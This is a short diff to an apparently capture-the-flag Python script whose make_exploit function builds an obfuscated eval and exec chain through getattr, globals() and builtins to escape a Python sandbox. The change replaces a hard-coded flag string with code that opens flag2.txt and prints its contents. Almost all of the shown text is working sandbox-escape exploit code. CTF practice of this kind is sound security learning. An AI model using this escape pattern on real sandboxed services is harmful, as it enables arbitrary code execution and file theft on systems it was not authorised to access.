@@ -13,7 +13,7 @@ def make_exploit(code):
                 _make_getattr_call('globals()', '{get}') + '({builtins})',
                 '{eval}') + '({code})').format(**locals())
 
-exploit =  make_exploit("""exec('import os, sys;sys.stdout = sys.__stdout__;print("CSeC{Qu4ck_15_h1b3rn471ng}");sys.stdout = open(os.devnull, "w")')""")
+exploit =  make_exploit("""exec('import os, sys;sys.stdout = sys.__stdout__;flag = open("flag2.txt").read();print(flag);sys.stdout = open(os.devnull, "w")')""")
 
 print(exploit)
 #eval(exploit)
